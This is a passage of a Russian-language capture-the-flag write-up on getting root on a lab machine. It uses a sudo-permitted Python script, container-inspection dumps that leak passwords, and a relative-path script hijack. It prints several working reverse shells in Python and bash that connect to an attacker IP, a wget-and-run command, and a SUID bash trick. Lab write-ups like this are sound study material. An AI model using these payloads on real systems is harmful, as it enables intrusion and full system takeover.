—É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏ —Å –∏–º–µ–Ω–µ–º cody. –ò—Ç–∞–∫, —è –¥–µ–ª–∞—é –ø–æ–ø—ã—Ç–∫—É –∏‚Ä¶

```
sudo -S -l
```

–ò–ª–∏ –º–æ–∂–Ω–æ –ø—Ä–æ—Å—Ç–æ:

```
sudo -l
```

![[Pasted image 20230708151306.png]]

–ï—Å—Ç—å —Å–∫—Ä–∏–ø—Ç, –∫–æ—Ç–æ—Ä—ã–π —è –º–æ–≥—É –∑–∞–ø—É—Å—Ç–∏—Ç—å –∫–∞–∫ root! –£—Ä–∞!

–ü–æ—Å–∫–æ–ª—å–∫—É —É –º–µ–Ω—è –µ—Å—Ç—å –ø–∞—Ä–æ–ª—å –∏ –ø–æ—Ä—Ç ssh –æ—Ç–∫—Ä—ã—Ç, —è –ø–æ–ø—ã—Ç–∞—é—Å—å –≤–æ–π—Ç–∏ —Ç—É–¥–∞, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –ª—É—á—à—É—é –æ–±–æ–ª–æ—á–∫—É. –≠–¢–û –†–ê–ë–û–¢–ê–ï–¢.

![[Pasted image 20230709015639.png]]

–≠—Ç–æ —É–ø—Ä–æ—Å—Ç–∏—Ç –∑–∞–¥–∞—á—É. –Ø –≤–æ–∑–≤—Ä–∞—â–∞—é—Å—å –∫ —ç—Ç–æ–º—É —Å—Ü–µ–Ω–∞—Ä–∏—é –∏ –ø—ã—Ç–∞—é—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å –µ–≥–æ –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ, —á—Ç–æ–±—ã –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å, —á—Ç–æ –ø—Ä–æ–∏–∑–æ–π–¥–µ—Ç. –ò–Ω—Ç–µ—Ä–µ—Å–Ω—ã–π. –î–∞–≤–∞–π—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–∏–º, —á—Ç–æ –¥–µ–ª–∞–µ—Ç —ç—Ç–æ—Ç —Å–∫—Ä–∏–ø—Ç:

```
sudo -S /usr/bin/python3 /opt/scripts/system-checkup.py random
```

–ú—ã –≤–∏–¥–∏–º, —á—Ç–æ –∑–∞–ø—É—Å–∫–∞–µ–º —Å–∫—Ä–∏–ø—Ç system-checkup.py –æ—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è root. –•–º, —ç—Ç–æ—Ç —Å–∫—Ä–∏–ø—Ç –Ω–µ —á–∏—Ç–∞–µ—Ç—Å—è, —Ç–æ–ª—å–∫–æ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π; –ú—ã –ø—Ä–æ–≤–µ—Ä–∏–º —ç—Ç–æ.

![[Pasted image 20230710062126.png]]

–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–∞–∂–¥–æ–π —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω–æ–π –ø–æ–¥–∫–æ–º–∞–Ω–¥—ã.

```
docker-ps
```

![[Pasted image 20230710062542.png]]

–ú—ã –≤–∏–¥–∏–º —á—Ç–æ —ç—Ç–∏ –¥–≤–∞ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞, –∑–∞–ø—É—â–µ–Ω–Ω—ã–µ –Ω–∞ –º–∞—à–∏–Ω–µ. –ù–∞ –æ–¥–Ω–æ–º —Ä–∞–±–æ—Ç–∞–µ—Ç —Å–µ—Ä–≤–µ—Ä gitra, –∞ –Ω–∞ –¥—Ä—É–≥–æ–º - —Å–µ—Ä–≤–µ—Ä MySQL.

–ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–æ–º–∞–Ω–¥—É **docker-inspect**:

```
docker-inspect
```


![[Pasted image 20230710063627.png]]

–ù–∞—Å –ø—Ä–æ—Å—è—Ç—å —á—Ç–æ–±—ã –º—ã —É–∫–∞–∑–∞–ª–∏ —Ñ–æ—Ä–º–∞—Ç.

–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–º–∞–Ω–¥—ã **full-checkup**:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

–í –æ—Ç–≤–µ—Ç –ø–æ–ª—É—á–∞–µ–º:

```
Something went wrong
```

–ù–∞–º –≥–æ–≤–æ—Ä—è—Ç—å —á—Ç–æ —á—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫!

–û–∫–µ–π, –∏–∑ —ç—Ç–∏—Ö —Å—É–±–∫–æ–º–º–∞–Ω–¥—ã –≤—ã–¥–µ–ª—è–µ—Ç—Å—è **docker-inspect**. –ß—Ç–æ–±—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–æ–º–∞–Ω–¥—É **docker-inspect**, –Ω–∞–º –Ω—É–∂–Ω–æ –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å —Ñ–æ—Ä–º–∞—Ç –∏ –∏–º—è –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞. –ù–µ–º–Ω–æ–≥–æ –ø–æ–∏—Å–∫–∞–≤ –≤ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–µ –Ω–∞—Ö–æ–¥–∏–º:

![[Pasted image 20230710065205.png]]

–£ –Ω–∞—Å –ø–æ–ª—É—á–∞–µ—Ç—Å—è –≤–æ—Ç —Ç–∞–∫–æ–π —Å–∏–Ω—Ç–∞–∫—Å–∏—Å:

```bash
docker inspect --format='{{json .Config}}' $INSTANCE_ID
```

–ê –µ—Å–ª–∏ –±—ã—Ç—å —Ç–æ—á–Ω–µ–µ —Ç–æ:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' <instance-id_or_name>
```

_—Å–±—Ä–æ—Å –¥–∞–Ω–Ω—ã—Ö –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ gitea_

```
sudo -S /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json.}}' gitea
```

![[Pasted image 20230710081115.png]]

–ß—Ç–æ–±—ã –±—ã–ª–∞ —É–¥–æ–±–Ω–µ–µ –∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å –Ω–∞—à –≤—ã–≤–æ–¥ –º–æ–∂–µ–º –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–º —Å–µ—Ä–≤–∏—Å–æ–º

![[Pasted image 20230710081651.png]]
https://jsonformatter.org/json-pretty-print

–æ—Ç–º–µ—á–∞—è –º–Ω–æ–≥–æ–µ –≤ _–¥–∞–º–ø–µ gitea_, –Ω–æ –Ω–µ—á–µ–≥–æ –ø–æ–ª—å–µ–∑–Ω–æ–≥–æ —Ç–∞–º –Ω–µ –Ω–∞—à–ª–∏—é _–°–±—Ä–æ—Å –¥–∞–Ω–Ω—ã—Ö –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ MySQL_:

```bash
sudo -S /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json.}}' mysql_db
```

![[Pasted image 20230710083522.png]]

—É –Ω–∞—Å –µ—Å—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø–∞—Ä–æ–ª–µ–π –≤ —ç—Ç–æ–º –¥–∞–º–ø–µ

![[Pasted image 20230710083536.png]]

–Ω—É –Ω–∏—á–µ–≥–æ –æ—Å–æ–±–µ–Ω–Ω–æ–≥–æ –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö MySQL –Ω–µ—Ç

![[Pasted image 20230710083554.png]]

–º—ã –ø–æ–ª—É—á–∏–ª–∏ –æ—à–∏–±–∫—É –≤ —ç—Ç–æ–º —Ñ–∞–π–ª–µ. –ú—ã –º–æ–∂–µ–º –ø–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å –≤–æ–π—Ç–∏ –≤ gitra —Å —ç—Ç–∏–º–∏ —É—á–µ—Ç–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏ –∫–∞–∫ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä

![[Pasted image 20230710083647.png]]

–º—ã –º–æ–∂–µ–º –≤–æ–π—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º—É –∫–∞–∫ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä —Å –ø–∞—Ä–æ–ª–µ–º, –∫–æ—Ç–æ—Ä—ã–π –º—ã –Ω–∞—à–ª–∏ –≤ –¥–∞–º–ø–µ MySQL

![[Pasted image 20230710083711.png]]

—É –Ω–∞—Å –µ—Å—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å—Ü–µ–Ω–∞—Ä–∏–µ–≤, –∫–æ—Ç–æ—Ä—ã–µ –º—ã –∑–∞–ø—É—Å–∫–∞–µ–º, –º—ã –Ω–µ –º–æ–∂–µ–º –∏–∑–º–µ–Ω–∏—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Å—Ü–µ–Ω–∞—Ä–∏—è.  –° —ç—Ç–∏–º–∏ —É—á–µ—Ç–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏ –º—ã –º–æ–∂–µ–º –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—é –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞, –≥–¥–µ –º—ã, –Ω–∞–∫–æ–Ω–µ—Ü, –Ω–∞—Ö–æ–¥–∏–º –∏—Å—Ö–æ–¥–Ω—ã–π –∫–æ–¥ —Å–∫—Ä–∏–ø—Ç–æ–≤ Python, –∫–æ—Ç–æ—Ä—ã–µ –º—ã –æ–±–Ω–∞—Ä—É–∂–∏–ª–∏ —Ä–∞–Ω–µ–µ –≤ `/opt/scripts` –∫–∞—Ç–∞–ª–æ–≥. –≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –Ω–∞–º –∏–∑—É—á–∏—Ç—å –∫–æ–¥ –∏ –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –ª—é–±—ã–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –∏–ª–∏ —Å–ª–∞–±—ã–µ –º–µ—Å—Ç–∞, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–ª—å–Ω–µ–π—à–µ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –∫ —Å–∏—Å—Ç–µ–º–µ. –í —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–∏ –º—ã –Ω–∞—Ö–æ–¥–∏–º –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ñ–∞–π–ª–æ–≤, –æ–¥–∏–Ω –∏–∑ –∫–æ—Ç–æ—Ä—ã—Ö –º—ã –º–æ–∂–µ–º –∑–∞–ø—É—Å—Ç–∏—Ç—å –∫–∞–∫ **root** .  

–ü–æ–º–Ω–∏—Ç–µ –ø–æ–¥–∫–æ–º–∞–Ω–¥—É ¬´full-checkup¬ª, –∫–æ—Ç–æ—Ä–∞—è –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å –æ—à–∏–±–∫–æ–π? –ß—Ç–æ –∂, —Ç–µ–ø–µ—Ä—å –º—ã –º–æ–∂–µ–º –∏–∑—É—á–∏—Ç—å –µ–≥–æ –∏ —Ç–æ, –∫–∞–∫ –æ–Ω –ø—ã—Ç–∞–µ—Ç—Å—è –≤—ã–ø–æ–ª–Ω–∏—Ç—å—Å—è.  –¶–µ–Ω–∞—Ä–∏–π `system-checkup.py` –æ—Å–æ–±–µ–Ω–Ω–æ –∏–Ω—Ç–µ—Ä–µ—Å–µ–Ω. –ò–∑—É—á–∏–≤ –∫–æ–¥, —è –æ–±–Ω–∞—Ä—É–∂–∏–ª, –ø–æ—á–µ–º—É –æ–Ω –≤–æ–∑–≤—Ä–∞—â–∞–ª —Å–æ–æ–±—â–µ–Ω–∏–µ ¬´–ß—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫¬ª –ø—Ä–∏ –ø—Ä–µ–¥—ã–¥—É—â–µ–º –∑–∞–ø—É—Å–∫–µ. –ß—Ç–æ –µ—â–µ –±–æ–ª–µ–µ –≤–∞–∂–Ω–æ, —è —Ç–∞–∫–∂–µ –æ–ø—Ä–µ–¥–µ–ª–∏–ª –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—É—é —É—è–∑–≤–∏–º–æ—Å—Ç—å, –∫–æ—Ç–æ—Ä—É—é –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∫–æ—Ä–Ω–µ–≤–æ–≥–æ —à–µ–ª–ª–∞ –≤ —Å–∏—Å—Ç–µ–º–µ.

–ó–∞–≥–ª—è–Ω—É–≤ –∏—Å—Ö–æ–¥–Ω—ã–π –∫–æ–¥, –º—ã —É–≤–∏–¥–∏–º –∫–æ–¥ **system-checkup.py**, –º—ã —É–≤–∏–¥–∏–º, —á—Ç–æ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ **full-check.py** –Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω –≤ —Å–∫—Ä–∏–ø—Ç–µ

![[Pasted image 20230710085303.png]]

```python
...
elif action == 'full-checkup':
   try:
        arg_list = ['./full-checkup.sh']
        print(run_command(arg_list))
        print('[+] Done!')
    except:
		print('Something went wrong')
		exit(1)
...
```


–ø–æ—ç—Ç–æ–º—É –µ–≥–æ –º–æ–∂–Ω–æ –∑–∞–ø—É—Å—Ç–∏—Ç—å, —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –º—ã –Ω–∞—Ö–æ–¥–∏–º—Å—è –≤ —Ç–æ–º –∂–µ –∫–∞—Ç–∞–ª–æ–≥–µ, —á—Ç–æ –∏ —Å–∫—Ä–∏–ø—Ç **full-checkup.sh**. –û–Ω –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ –∫–∞—Ç–∞–ª–æ–≥–µ **/opt/scripts** –∫–∞–∫ –Ω–∞–º –ø–æ–∫–∞–∑–∞–ª–∞ –∫–æ–º–∞–Ω–¥–∞ `sudo -l`

![[Pasted image 20230710085644.png]]

–ø–æ—Å–º–æ—Ç—Ä–∏—Ç–µ –∫–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç –µ—Å–ª–∏ –º—ã –Ω–∞—Ö–æ–¥–∏–º—Å—è –≤ –∫–∞—Ç–∞–ª–æ–≥–µ —Å—Ü–µ–Ω–∞—Ä–∏—è, –∞ —á—Ç–æ, –µ—Å–ª–∏ –º—ã —Å–æ–∑–¥–∞–¥–∏–º —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–π —Å–∫—Ä–∏–ø—Ç –∏ –∑–∞–ø—É—Å—Ç–∏–º –µ–≥–æ
—Å–æ–∑–¥–∞—Ç—å –æ–±–æ–ª–æ—á–∫—É rev –≤ python bash –Ω–µ –ø–æ–ª—É—á–∏—Ç—Å—è

![[Pasted image 20230710091101.png]]

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.112",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
```

—Å–æ—Ö—Ä–∞–Ω–∏—Ç–µ –µ–≥–æ –∫–∞–∫ full-checkup.sh –∏ —Ä–∞–∑–º–µ—Å—Ç–∏—Ç—å –µ–≥–æ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ Python

![[Pasted image 20230710091155.png]]

```bash
python3 -m http.server 1234
```

—Å–∫–æ–ø–∏—Ä—É–π—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ —Ñ–∞–π–ª –∏ –∑–∞–ø—É—Å—Ç–∏—Ç—å –ø—Ä–æ—Å–ª—É—à–∏–≤–∞—Ç–µ–ª—å NC

![[Pasted image 20230710091226.png]]

–∑–∞—Ç–µ–º –≤—ã–ø–æ–ª–Ω–∏—Ç–µ —ç—Ç—É –∫–æ–º–∞–Ω–¥—É –≤ –¥–æ—Å—Ç—É–ø–Ω–æ–º –¥–ª—è –∑–∞–ø–∏—Å–∏ –∫–∞—Ç–∞–ª–æ–≥–µ /tmp

![[Pasted image 20230710091313.png]]

```python
wget http://10.10.14.112:1234/full-checkup.sh;chmod +x full-checkup.sh; sudo -S /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

![[Pasted image 20230710091345.png]]


**–°–ø–æ—Å–æ–± ‚Ññ2**

–°–∫—Ä–∏–ø—Ç –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω—ã–π –ø—É—Ç—å –∫ **full-checkup.sh**. –≠—Ç–æ –¥–∞–µ—Ç –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å —Å–∏—Å—Ç–µ–º—É, —Å–æ–∑–¥–∞–≤–∞—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π **full-checkup.sh**

–ò–∑ —Ç–æ–≥–æ, —á—Ç–æ –º—ã –≤–∏–¥–∏–º –≤ —Å—Ü–µ–Ω–∞—Ä–∏–∏, –µ—Å–ª–∏ –º—ã —Å–æ–∑–¥–∞–¥–∏–º —Ñ–∞–π–ª —Å –∏–º–µ–Ω–µ–º full-checkup.sh, –æ–Ω –≤—ã–ø–æ–ª–Ω–∏—Ç –µ–≥–æ, –ø–æ—Å–∫–æ–ª—å–∫—É —Å–Ω–∞—á–∞–ª–∞ –±—É–¥–µ—Ç –∏—Å–∫–∞—Ç—å, —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –ª–∏ –æ–Ω –≤ —Ç–æ–º –ø—É—Ç–∏, –≥–¥–µ –º—ã –Ω–∞—Ö–æ–¥–∏–º—Å—è.

–ú—ã —Å–æ–∑–¥–∞–µ–º —Ñ–∞–π–ª –≤ bash, —á—Ç–æ–±—ã –∏–∑–º–µ–Ω–∏—Ç—å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è bash –Ω–∞ SUID.

```bash
#!/bin/bash 
chmod +s /bin/bash
```

–ú—ã –¥–∞–µ–º –µ–º—É —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –∏ –≤—ã–ø–æ–ª–Ω—è–µ–º —Å–∫—Ä–∏–ø—Ç, –ø–µ—Ä–µ–¥–∞–≤–∞—è –µ–º—É –∏–º—è —Ñ–∞–π–ª–∞, —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –¥–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã —Å—Ç–∞—Ç—å root –∏ –∏–º–µ—Ç—å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å —á–∏—Ç–∞—Ç—å —Ñ–ª–∞–≥.

```bash
svc@busqueda:/tmp$ cat full-checkup.sh
svc@busqueda:/tmp$ chmod +x full-checkup.sh 
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:/tmp$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1396520 Jan 6 2022 /bin/bash
svc@busqueda:/tmp$ bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
7d81086647c8095b6916e9cb66f1a104
bash-5.1#
```

**–°–ø–æ—Å–æ–± ‚Ññ3**

–ò—Ç–∞–∫, –≤—Å–µ, —á—Ç–æ –Ω–∞–º –Ω—É–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å, —ç—Ç–æ —Å–æ–∑–¥–∞—Ç—å —Å–∫—Ä–∏–ø—Ç –≤ –¥–æ—Å—Ç—É–ø–Ω–æ–º –¥–ª—è –∑–∞–ø–∏—Å–∏ –∫–∞—Ç–∞–ª–æ–≥–µ —Å –∏–º–µ–Ω–µ–º ¬´full-checkup.sh¬ª, –∏ –º—ã –º–æ–∂–µ–º –ø–æ–º–µ—Å—Ç–∏—Ç—å –≤–Ω—É—Ç—Ä—å –Ω–∞—à—É –æ–±—Ä–∞—Ç–Ω—É—é –æ–±–æ–ª–æ—á–∫—É –¥–ª—è –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π root.

```Python
#!/usr/bin/python3
import socket
import subprocess
import os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<c2-ipv4>",<c2-port>))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```

–ò–ª–∏ —Ç–∞–∫:

```python
import socket ¬†  
import subprocess  
import os  
  
host = "IPv4"  
port = <port>  
  
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
sock.connect((host,port))  
  
os.dup2(sock.fileno(),0)  
os.dup2(sock.fileno(),1)  
os.dup2(sock.fileno(),2)  
  
subprocess.call(["/bin/bash", "-i"])
```

–°–Ω–∞—á–∞–ª–æ –∫–æ–Ω–µ—á–Ω–æ –∂–µ –≤—ã –¥–æ–∂–Ω—ã —Å–ª—É—à–∞—Ç—å –æ–ø—Ä–µ–¥–µ–ª—ë–Ω–Ω—ã–π –ø–æ—Ä—Ç:

```bash
nc -nvlp <port>
```

–ò –∑–∞–ø—É—Å—Ç–∏—Ç—å –≤ –º–∞—à–∏–Ω–µ:

```BASH
svc$ sudo -S /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
... hang ...
```

–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –ø–æ–¥–∫–æ–º–∞–Ω–¥—ã ¬´–ø–æ–ª–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞¬ª.

```BASH
root# ls /root
> ecosystem.config.js root.txt scripts snap
root# cat /root/root.txt
> ********************************
```

–û–±—Ä–∞—Ç–Ω—ã–π —à–µ–ª–ª –æ—Ç–ª–æ–≤–∏–ª –∏ —Å–æ–±—Ä–∞–ª 'root.txt'.

–¢–µ–ø–µ—Ä—å —É –Ω–∞—Å –µ—Å—Ç—å ¬´root.txt¬ª.

**–°–ø–æ—Å–æ–± ‚Ññ4**

–ü–æ—Å–ª–µ –ø–æ–∏—Å–∫–∞ –∫–∞–∫–æ–π-–ª–∏–±–æ –ø—Ä–æ–±–ª–µ–º—ã –≤ –∏—Å—Ö–æ–¥–Ω–æ–º –∫–æ–¥–µ –º—ã –≤–∏–¥–∏–º, —á—Ç–æ –¥–µ–π—Å—Ç–≤–∏–µ ¬´–ø–æ–ª–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞¬ª –≤—ã–ø–æ–ª–Ω—è–µ—Ç —Å–∫—Ä–∏–ø—Ç ¬´./full-checkup.sh¬ª —Å –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω—ã–º –ø—É—Ç–µ–º, –∑–∞—Ç–µ–º –Ω–∞–º –Ω—É–∂–Ω–æ —Å–æ–∑–¥–∞—Ç—å –Ω–æ–≤—ã–π —Å–∫—Ä–∏–ø—Ç —Å –Ω–∞—à–∏–º –æ–±—Ä–∞—Ç–Ω—ã–º –∫–æ–¥–æ–º –æ–±–æ–ª–æ—á–∫–∏ –∏ –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Å–∫—Ä–∏–ø—Ç –≤ —Ç–æ–º –∂–µ –∫–∞—Ç–∞–ª–æ–≥–µ:

```bash
#!/bin/bash

# set the ip address of your machine
ip='<Your IP Address>'
# set the port number of your listener
port=1234

# create the reverse shell
/bin/bash -i >& /dev/tcp/$ip/$port 0>&1
```

–ü–æ—Å–ª–µ —Å–æ–∑–¥–∞–Ω–∏—è –Ω–∞—à–µ–π –æ–±—Ä–∞—Ç–Ω–æ–π –æ–±–æ–ª–æ—á–∫–∏ –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å–∫—Ä–∏–ø—Ç–∞ —Å –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏ sudo –º—ã –ø–æ–ª—É—á–∏–º –Ω–æ–≤–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —á–µ—Ä–µ–∑ –Ω–∞—à —Å–µ—Ä–≤–µ—Ä netcat:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

![[Pasted image 20230710092623.png]]



